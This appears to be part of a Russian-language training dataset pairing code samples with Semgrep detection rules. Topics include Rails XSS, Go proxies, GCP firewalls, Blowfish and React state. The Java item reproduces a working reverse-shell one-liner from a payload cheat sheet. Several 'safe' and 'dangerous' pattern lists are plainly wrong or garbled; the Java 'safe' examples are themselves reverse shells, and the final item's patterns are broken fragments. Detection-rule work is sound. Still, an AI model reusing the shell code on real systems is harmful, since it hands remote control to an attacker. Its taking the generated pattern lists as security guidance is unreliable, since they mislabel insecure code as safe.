    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-raw.rb\n# cf. https://github.com/rails/rails/blob/62d089a4ad0170320b851addf76f7f48a49d68d8/actionview/test/template/output_safety_helper_test.rb\n\n# frozen_string_literal: true\n\nrequire \"abstract_unit\"\n\nclass OutputSafetyHelperTest < ActionView::TestCase\n  tests ActionView::Helpers::OutputSafetyHelper\n\n  def setup\n    @string = \"hello\"\n  end\n\n  test \"raw returns the safe string\" do\n    # ruleid: avoid-raw\n    result = raw(@string)\n    assert_equal @string, result\n    assert_predicate result, :html_safe?\n  end\n\n  test \"raw handles nil values correctly\" do\n    # ruleid: avoid-raw\n    assert_equal \"\", raw(nil)\n  end\n\n  test \"safe_join should html_escape any items, including the separator, if they are not html_safe\" do\n    # ruleid: avoid-raw\n    joined = safe_join([raw(\"<p>foo</p>\"), \"<p>bar</p>\"], \"<br />\")\n    assert_equal \"<p>foo</p>&lt;br /&gt;&lt;p&gt;bar&lt;/p&gt;\", joined\n\n    # ruleid: avoid-raw\n    joined = safe_join([raw(\"<p>foo</p>\"), raw(\"<p>bar</p>\")], raw(\"<br />\"))\n    assert_equal \"<p>foo</p><br /><p>bar</p>\", joined\n  end\n\n  test \"safe_join should work recursively similarly to Array.join\" do\n    joined = safe_join([\"a\", [\"b\", \"c\"]], \":\")\n    assert_equal \"a:b:c\", joined\n\n    joined = safe_join(['\"a\"', [\"<b>\", \"<c>\"]], \" <br/> \")\n    assert_equal \"&quot;a&quot; &lt;br/&gt; &lt;b&gt; &lt;br/&gt; &lt;c&gt;\", joined\n  end\n\n  test \"safe_join should return the safe string separated by $, when second argument is not passed\" do\n    default_delimeter = $,\n\n    begin\n      $, = nil\n      joined = safe_join([\"a\", \"b\"])\n      assert_equal \"ab\", joined\n\n      silence_warnings do\n        $, = \"|\"\n      end\n      joined = safe_join([\"a\", \"b\"])\n      assert_equal \"a|b\", joined\n    ensure\n      $, = default_delimeter\n    end\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• raw(@string)\n• raw(nil)\n• safe_join([raw(\"<p>foo</p>\")>, \"<p>bar</p>\">, \"<br />\")\n\nБезопасные паттерны:  \n• raw(@string).html_safe?\n• safe_join([\"<p>foo</p>\">, \"<p>bar</p>\">, \"<br />\", html_safe: true)\n\nЛегенда аннотаций:\n- // ruleid:avoid-raw: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-raw: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-raw\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_cross_site_scripting.rb\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://api.rubyonrails.org/classes/ActionView/Helpers/OutputSafetyHelper.html#method-i-raw\n    - https://www.netsparker.com/blog/web-security/preventing-xss-ruby-on-rails-web-applications/\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    'raw()' bypasses HTML escaping. If external data can reach here, this exposes your application\n    to cross-site scripting (XSS) attacks. If you must do this, construct individual strings\n    and mark them as safe for HTML rendering with `html_safe()`.\n  languages: [ruby]\n  severity: WARNING\n  pattern: raw(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'raw(...)' в Ruby, который обходит HTML-экранирование. Это может привести к XSS-уязвимостям, если внешние данные могут достичь этого места. Правило ищет вызовы метода 'raw(...)', используя шаблон 'pattern: raw(...)'.\n\n# Ключевые элементы:\n- ID: avoid-raw\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-raw",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения reverseproxy-director\nОписание уязвимости: ReverseProxy can remove headers added by Director. Consider using ReverseProxy.Rewrite instead of ReverseProxy.Director.\nCWE: CWE-115: Misinterpretation of Input\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-115: Misinterpretation of Input\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: reverseproxy-director.go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"net/http/httputil\"\n\t\"net/url\"\n)\n\nfunc NewProxy(targetHost string) (*httputil.ReverseProxy, error) {\n\turl, err := url.Parse(targetHost)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tproxy := httputil.NewSingleHostReverseProxy(url)\n\n\toriginalDirector := proxy.Director\n\t// ruleid: reverseproxy-director\n\tproxy.Director = func(req *http.Request) {\n\t\toriginalDirector(req)\n\t\tmodifyRequest(req)\n\t}\n\treturn proxy, nil\n}\n\nfunc modifyRequest(req *http.Request) {\n\treq.Header.Set(\"Extra-Header\", \"nice\")\n}\n\nfunc ProxyRequestHandler(proxy *httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tproxy.ServeHTTP(w, r)\n\t}\n}\n\ntype Fake struct {\n\tDirector string\n}\n\nfunc extraCases() {\n\trp := &httputil.ReverseProxy{\n\t\t// ruleid: reverseproxy-director\n\t\tDirector: func(req *http.Request) {\n\t\t\tmodifyRequest(req)\n\t\t},\n\t}\n\t_ = rp\n\n\tf := Fake{\n\t\t// ok: reverseproxy-director\n\t\tDirector: \"abcd\",\n\t}\n\t_ = f\n}\n\nfunc main() {\n\tproxy, err := NewProxy(\"https://example.com\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\thttp.HandleFunc(\"/\", ProxyRequestHandler(proxy))\n\tlog.Fatal(http.ListenAndServe(\":8080\", nil))\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• proxy := httputil.NewSingleHostReverseProxy(url)\nproxy.Director = func(req *http.Request) { ... }\n• rp := &httputil.ReverseProxy{\n\tDirector: func(req *http.Request) { ... }\n}\n\nБезопасные паттерны:  \n• rp := &httputil.ReverseProxy{\n\tDirector: \"abcd\"\n}\n• import _ \"net/http/httputil\"\n\nЛегенда аннотаций:\n- // ruleid:reverseproxy-director: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:reverseproxy-director: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: reverseproxy-director\n  message: >-\n    ReverseProxy can remove headers added by Director. Consider using ReverseProxy.Rewrite\n    instead of ReverseProxy.Director.\n  languages: [go]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      import \"net/http/httputil\"\n      ...\n  - pattern-either:\n      - pattern: $PROXY.Director = $FUNC\n      - patterns:\n          - pattern-inside: |\n              httputil.ReverseProxy{\n                  ...\n              }\n          - pattern: |\n              Director: $FUNC\n  metadata:\n    cwe:\n    - \"CWE-115: Misinterpretation of Input\"\n    category: security\n    subcategory:\n    - audit\n    technology:\n      - go\n    confidence: MEDIUM\n    likelihood: LOW\n    impact: LOW\n    references:\n      - https://github.com/golang/go/issues/50580\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования httputil.ReverseProxy.Director в Go-коде. Паттерн ищет импорт пакета 'net/http/httputil' и затем проверяет либо присвоение переменной $PROXY.Director функции ($PROXY.Director = $FUNC), либо наличие структуры httputil.ReverseProxy с полем Director, содержащим функцию. Это может привести к удалению заголовков, добавленных обратным прокси-сервером, и рекомендуется использовать метод Rewrite вместо Director.\n\n# Ключевые элементы:\n- ID: reverseproxy-director\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "reverseproxy-director",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-compute-firewall-unrestricted-ingress-21\nОписание уязвимости: Ensure Google compute firewall ingress does not allow unrestricted FTP access\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-compute-firewall-unrestricted-ingress-21.tf\n# ok: gcp-compute-firewall-unrestricted-ingress-21\nresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"21\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ftp\"]\n}\n\n# ok: gcp-compute-firewall-unrestricted-ingress-21\nresource \"google_compute_firewall\" \"allow_different_int\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [4624]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ftp\"]\n}\n\n# ok: gcp-compute-firewall-unrestricted-ingress-21\nresource \"google_compute_firewall\" \"allow_null\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = null\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ftp\"]\n}\n\n# fail\n# ruleid: gcp-compute-firewall-unrestricted-ingress-21\nresource \"google_compute_firewall\" \"allow_ftp_int\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [21]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}\n\n# fail\n# ruleid: gcp-compute-firewall-unrestricted-ingress-21\nresource \"google_compute_firewall\" \"allow_multiple\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"1024-65535\", \"21\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_compute_firewall\" \"allow_ftp_int\" { ... allow { protocol = \"tcp\" ports = [21] } source_ranges = [\"0.0.0.0/0\"] ... }\n• resource \"google_compute_firewall\" \"allow_multiple\" { ... allow { protocol = \"tcp\" ports = [\"1024-65535\", \"21\"] } source_ranges = [\"0.0.0.0/0\"] ... }\n\nБезопасные паттерны:  \n• resource \"google_compute_firewall\" \"restricted\" { ... allow { protocol = \"tcp\" ports = [21] } source_ranges = [\"172.1.2.3/32\"] ... }\n• resource \"google_compute_firewall\" \"allow_different_int\" { ... allow { protocol = \"tcp\" ports = [4624] } source_ranges = [\"172.1.2.3/32\"] ... }\n• resource \"google_compute_firewall\" \"allow_null\" { ... allow { protocol = \"tcp\" ports = null } source_ranges = [\"172.1.2.3/32\"] ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-compute-firewall-unrestricted-ingress-21: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-compute-firewall-unrestricted-ingress-21: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-compute-firewall-unrestricted-ingress-21\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_compute_firewall\" \"...\" {\n        ...\n        allow {\n          protocol = \"tcp\"\n          ports    = [21]\n        }\n        source_ranges = [\"0.0.0.0/0\"]\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_compute_firewall\" \"...\" {\n        ...\n        allow {\n          protocol = \"tcp\"\n          ports    = [..., \"21\", ...]\n        }\n        source_ranges = [\"0.0.0.0/0\"]\n        ...\n        }\n  message: >-\n    Ensure Google compute firewall ingress does not allow unrestricted FTP access\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Compute Engine Firewall, которые разрешают входящий трафик протокола TCP порта 21 (FTP) от любого источника IP-адреса ('0.0.0.0/0'). Порт 21 является стандартным портом для FTP-сервера, и разрешение доступа к нему от всех источников представляет собой потенциальную угрозу безопасности, так как позволяет любому пользователю подключиться и получить доступ к ресурсам сервера. Правило использует шаблон ресурса Google Compute Engine Firewall и проверяет наличие разрешений на порт 21 с источником '0.0.0.0/0'. Если оба условия совпадают, правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: gcp-compute-firewall-unrestricted-ingress-21\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-compute-firewall-unrestricted-ingress-21",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения java-reverse-shell\nОписание уязвимости: Semgrep found potential reverse shell behavior\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: java-reverse-shell.java\n// Example shell from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1\n// ruleid: java-reverse-shell\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: java-reverse-shell\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInput\n• // ruleid: java-reverse-shell\nProcessBuilder pb=new ProcessBuilder(\"cmd\", \"/c\", \"echo hello\");\nProcess p=pb.start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(), pe=p.getErrorStr\n\nБезопасные паттерны:  \n• // safe example\nProcess p=new ProcessBuilder(cmd).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputS\n• // safe example\nProcess p=new ProcessBuilder().start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStre\n\nЛегенда аннотаций:\n- // ruleid:java-reverse-shell: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:java-reverse-shell: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: java-reverse-shell\n  patterns:\n  - pattern-either:\n    - pattern: |\n        Socket $S=new Socket(...);\n        ...\n        InputStream $SI = $S.getInputStream();\n        ...\n        while(!$S.isClosed())\n        {\n          ...\n          while($SI.available()>0)$PO.write($SI.read());\n          ...\n          $SO.flush();\n          ...\n        }\n  - pattern-inside: |\n      Process $P=new ProcessBuilder(...).redirectErrorStream(true).start();\n      ...\n      $P.destroy();\n  message: Semgrep found potential reverse shell behavior\n  severity: WARNING\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    category: security\n    technology: [java]\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциально опасных конструкций, связанных с созданием обратных шеллов в Java. Первая часть шаблона ищет создание объекта типа 'Socket' и последующий ввод данных через поток ввода. Вторая часть шаблона внутри первой проверяет запуск процесса с перенаправлением стандартного потока ошибок и последующим уничтожением этого процесса. Эти действия могут быть использованы для выполнения команд с привилегиями удаленного пользователя.\n\n# Ключевые элементы:\n- ID: java-reverse-shell\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "java-reverse-shell",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-openai\nОписание уязвимости: Possibly found usage of AI: OpenAI\nCWE: \nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-openai.cs\n// ruleid: detect-openai\nusing OpenAI.Chat;\n\n// ruleid: detect-openai\nChatClient client = new(\"gpt-3.5-turbo\", Environment.GetEnvironmentVariable(\"OPENAI_API_KEY\"));\n\n// ruleid: detect-openai\nChatCompletion chatCompletion = client.CompleteChat(\n    [\n        new UserChatMessage(\"Say 'this is a test.'\")\n    ]);  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: detect-openai\nusing OpenAI.Chat;\n...\nChatClient client = new(\"gpt-3.5-turbo\", Environment.GetEnvironmentVariable(\"OPENAI_API_KEY\"));\n• // ruleid: detect-openai\nChatCompletion chatCompletion = client.CompleteChat([\n    new UserChatMessage(\"Say 'this is a test.'\")\n]);\n\nБезопасные паттерны:  \n• using Microsoft.Extensions.Configuration;\r\nIConfiguration config = new ConfigurationBuilder().AddJsonFile(\"appsettings.json\").Build();\n• public class MyClass {\r\n    public void MyMethod(){\r\n        // Safe code\n    }\r\n}\n• string openApiKey = \"my-secret-key\"; // Not detected as OpenAI\n\nЛегенда аннотаций:\n- // ruleid:detect-openai: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-openai: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-openai\n    languages:\n      - csharp\n    severity: INFO\n    message: \"Possibly found usage of AI: OpenAI\"\n    pattern-either:\n      - pattern: using OpenAI\n      - pattern: (ChatClient $CLIENT)\n      - pattern: (ChatClient $CLIENT).$FUNC(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных вызовов API OpenAI в C# коде. Анализ выполняется путем поиска использования имени 'OpenAI' или конструктора класса 'ChatClient', а также вызова метода этого объекта. Правило использует оператор 'pattern-either' для объединения нескольких шаблонов поиска. Шаблоны включают прямое упоминание 'OpenAI' и обращение к объекту 'ChatClient' через переменную или напрямую.\n\n# Ключевые элементы:\n- ID: detect-openai\n- Язык: csharp \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-openai",
      "language": "csharp",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: insecure-cipher-algorithm-blowfish\nОписание уязвимости: Blowfish is a block cipher developed by Bruce Schneier. It is known to be susceptible to attacks when using weak keys.  The author has recommended that users of Blowfish move to newer algorithms such as AES. With the `cryptography` package it is recommended to use `Fernet` which is a secure implementation of AES in CBC mode with a 128-bit key.  Alternatively, keep using the `Cipher` class from the hazmat primitives but use the AES algorithm instead.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-algorithms-blowfish.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/ciphers.py\n\nfrom cryptography.hazmat.primitives.ciphers import Cipher\nfrom cryptography.hazmat.primitives.ciphers import algorithms\nfrom cryptography.hazmat.primitives.ciphers import modes\nfrom cryptography.hazmat.backends import default_backend\nfrom struct import pack\n\n\n# ruleid:insecure-cipher-algorithm-blowfish\ncipher = Cipher(algorithms.Blowfish(key), mode=None, backend=default_backend())\nencryptor = cipher.encryptor()\nct = encryptor.update(b\"a secret message\")\n\n# ok:insecure-cipher-algorithm-blowfish\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\nencryptor = cipher.encryptor()\nct = encryptor.update(b\"a secret message\") + encryptor.finalize()\n\n\n// File: insecure-cipher-algorithms-blowfish.fixed.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/ciphers.py\n\nfrom cryptography.hazmat.primitives.ciphers import Cipher\nfrom cryptography.hazmat.primitives.ciphers import algorithms\nfrom cryptography.hazmat.primitives.ciphers import modes\nfrom cryptography.hazmat.backends import default_backend\nfrom struct import pack\n\n\n# ruleid:insecure-cipher-algorithm-blowfish\ncipher = Cipher(algorithms.AES(key), mode=None, backend=default_backend())\nencryptor = cipher.encryptor()\nct = encryptor.update(b\"a secret message\")\n\n# ok:insecure-cipher-algorithm-blowfish\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\nencryptor = cipher.encryptor()\nct = encryptor.update(b\"a secret message\") + encryptor.finalize()  # Ограничиваем длину\n\nОпасные паттерны:\n• cipher = Cipher(algorithms.Blowfish(key), mode=None, backend=default_backend())\n• cipher = Cipher(algorithms.Blowfish(key), mode=modes.ECB(), backend=default_backend())\n\nБезопасные паттерны:  \n• cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n• cipher = Cipher(algorithms.Salsa20(key), backend=default_backend())\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-algorithm-blowfish: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-algorithm-blowfish: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-algorithm-blowfish\n  message: >-\n    Blowfish is a block cipher developed by Bruce Schneier. It is known to be susceptible to attacks when using weak keys. \n    The author has recommended that users of Blowfish move to newer algorithms such as AES.\n    With the `cryptography` package it is recommended to use `Fernet` which is a secure implementation\n    of AES in CBC mode with a 128-bit key. \n    Alternatively, keep using the `Cipher` class from the hazmat primitives but use the AES algorithm instead.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L98\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B304\n    references:\n    - https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#weak-ciphers\n    - https://tools.ietf.org/html/rfc5469\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::symmetric-algorithm::cryptography\n  severity: WARNING\n  languages:\n  - python\n  patterns: \n    - pattern: cryptography.hazmat.primitives.ciphers.algorithms.$BLOWFISH($KEY)\n    - metavariable-regex:\n        metavariable: $BLOWFISH\n        regex: ^(Blowfish)$\n    - focus-metavariable: $BLOWFISH\n  fix: AES\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма шифрования Blowfish в Python-коде, который загружен через библиотеку cryptography. Паттерн ищет импорт модуля cryptography.hazmat.primitives.ciphers.algorithms и последующий вызов функции с аргументом, содержащим строку 'Blowfish'. Это позволяет обнаружить потенциально небезопасное использование Blowfish и предложить замену на более безопасный алгоритм, такой как AES.\n\n# Ключевые элементы:\n- ID: insecure-cipher-algorithm-blowfish\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-algorithm-blowfish",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: calling-set-state-on-current-state\nОписание уязвимости: Calling setState on the current state is always a no-op. Did you mean to change the state like $Y(!$X) instead?\nCWE: \nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: set-state-no-op.jsx\nimport { useState } from \"react\";\nimport styled from \"styled-components\";\n\nconst PolicyColumn = ({\n  group,\n  deck,\n}) => {\n  const [actionsExpanded, setActionsExpanded] = useState<boolean>(false);\n  const [columnRef, setColumnRef] = useState<HTMLElement | null>(null);\n  return (\n    <ColumnContainer>\n      <ColumnHeader>\n        <Button\n          small\n          minimal\n          onClick={() => {\n            // ruleid:calling-set-state-on-current-state\n            setActionsExpanded(actionsExpanded);\n          }}\n          intent={actionsExpanded ? Intent.PRIMARY : Intent.NONE}\n        >\n          <FontAwesomeIcon icon={faBell} />\n        </Button>\n        <Button\n          small\n          minimal\n          onClick={() => {\n            // ok\n            setActionsExpanded(!actionsExpanded);\n          }}\n          intent={actionsExpanded ? Intent.PRIMARY : Intent.NONE}\n        >\n          <FontAwesomeIcon icon={faBell} />\n        </Button>\n      </ColumnHeader>\n    </ColumnContainer>\n  );\n};\n\nexport default PolicyColumn;  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: set-state-no-op.jsx\nsetActionsExpanded(actionsExpanded);\n• // Another example of incorrect usage\nsetColumnRef(columnRef);\n\nБезопасные паттерны:  \n• // File: correct-use-of-setstate.jsx\nsetActionsExpanded(!actionsExpanded);\n• // Another valid case\nsetColumnRef(null);\n\nЛегенда аннотаций:\n- // ruleid:calling-set-state-on-current-state: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:calling-set-state-on-current-state: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: calling-set-state-on-current-state\n    patterns:\n      - pattern: $Y($X);\n      - pattern-inside: |\n          const [$X, $Y] = useState(...);\n          ...\n    message: >-\n      Calling setState on the current state is always a no-op. Did you mean to change the state like $Y(!$X) instead?\n    languages:\n      - javascript\n    severity: ERROR\n    metadata:\n      technology:\n        - react\n      category: correctness\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда функция setState вызывается с текущим состоянием ($X), что является пустой операцией. Правило использует шаблон, где $Y($X); указывает вызов функции setState, а pattern-inside проверяет наличие объявления переменной состояния через useState. В безопасных примерах ожидается, что состояние будет изменяться корректно, например, путем передачи выражения, обратного текущему состоянию.\n\n# Ключевые элементы:\n- ID: calling-set-state-on-current-state\n- Язык: javascript \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "calling-set-state-on-current-state",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-sub-network-logging-enabled\nОписание уязвимости: Ensure that VPC Flow Logs is enabled for every subnet in a VPC Network\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-sub-network-logging-enabled.tf\n# ok: gcp-sub-network-logging-enabled\nresource \"google_compute_subnetwork\" \"enabled\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.0.0.0/16\"\n  network       = \"google_compute_network.vpc.self_link\"\n\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\n\n# fail\n# ruleid: gcp-sub-network-logging-enabled\nresource \"google_compute_subnetwork\" \"default\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.0.0.0/16\"\n  network       = \"google_compute_network.vpc.id\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n  name = \\\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:gcp-sub-network-logging-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-sub-network-logging-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
